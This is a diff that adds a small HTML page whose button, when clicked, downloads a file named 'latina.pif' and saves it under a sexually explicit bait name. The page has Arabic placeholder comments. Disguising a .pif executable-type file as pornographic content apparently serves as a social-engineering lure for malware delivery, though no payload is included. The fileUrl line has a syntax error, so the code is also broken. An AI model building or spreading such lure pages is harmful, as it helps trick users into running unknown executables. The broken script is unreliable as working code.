@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download File</title>
+</head>
+<body>
+    <h1>Welcome to My Web Page</h1>
+    <button id="downloadBtn">Download File</button>
+
+    <script>
+        document.getElementById("downloadBtn").addEventListener("click", function() {
+            const fileUrl = ""latina.pif""; // ضع رابط الملف هنا
+            const fileName = "latina blowJob"; // ضع اسم الملف هنا
+            
+            const a = document.createElement("a");
+            a.href = fileUrl;
+            a.download = fileName;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+        });
+    </script>
+</body>
+</html>
